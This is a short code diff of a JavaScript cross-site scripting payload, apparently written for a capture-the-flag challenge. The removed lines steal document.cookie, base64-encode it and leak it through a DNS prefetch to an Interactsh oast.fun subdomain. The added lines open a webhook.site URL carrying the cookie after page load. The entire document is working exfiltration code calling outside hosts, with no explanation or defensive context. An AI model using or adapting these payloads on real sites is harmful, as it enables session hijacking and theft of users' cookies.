@@ -1,15 +1,5 @@
-setTimeout(() => {
-    let flag = document.cookie;
-    
-    // Convert to Base64, remove '=' padding, and make it completely lowercase
-    let safeFlag = btoa(flag).replace(/=/g, '').toLowerCase();
-
-    // Create the DNS prefetch link
-    let link = document.createElement('link');
-    link.rel = 'prefetch';
-    
-    // Inject the flag as a subdomain of your Interactsh domain
-    link.href = 'http://' + safeFlag + '.yzblscxpmqfiqbulugygj7soovv9fyojx.oast.fun/';
-    
-    document.head.appendChild(link);
-}, 2000);
+window.addEventListener('DOMContentLoaded', () => {
+    setTimeout(() => {
+        window.open('https://webhook.site/c28bdc7e-0993-4d8f-9a72-728714667c7f/?c=' + encodeURIComponent(document.cookie));
+    }, 2000);
+});
